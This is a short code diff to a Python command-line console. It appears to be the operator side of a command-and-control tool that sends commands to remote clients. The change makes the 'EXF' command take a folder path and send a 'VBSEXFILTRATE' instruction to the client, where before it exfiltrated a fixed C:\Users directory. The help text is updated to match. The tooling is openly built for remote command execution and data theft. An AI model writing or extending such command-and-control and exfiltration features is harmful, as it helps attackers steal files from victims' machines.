@@ -59,8 +59,8 @@ class Cli(ServerSubscriber):
                     self.switch_context_to_main()
                 elif user_input.upper().startswith('CMD '):
                     self.set_client_cmd(user_input[4:])
-                elif user_input.upper() == "EXFILTRATE" or user_input.upper() == "EXF":
-                    self.set_client_cmd("EXFILTRATE")
+                elif user_input.upper().startswith('EXF '):
+                    self.set_client_cmd(f"VBSEXFILTRATE{user_input[4:]}")
                 else:
                     self.print_unrecognized_command()
         except KeyboardInterrupt:
@@ -114,7 +114,7 @@ class Cli(ServerSubscriber):
             print("|----------------------------------------------------|")
             print("| cmd <command>    | set a command to execute        |")
             print("------------------------------------------------------")
-            print("| EXF              | exfiltrate data from C:\\Users   |")
+            print("| EXF <path>       | exfiltrate data from folder     |")
             print("------------------------------------------------------")
             print()
     
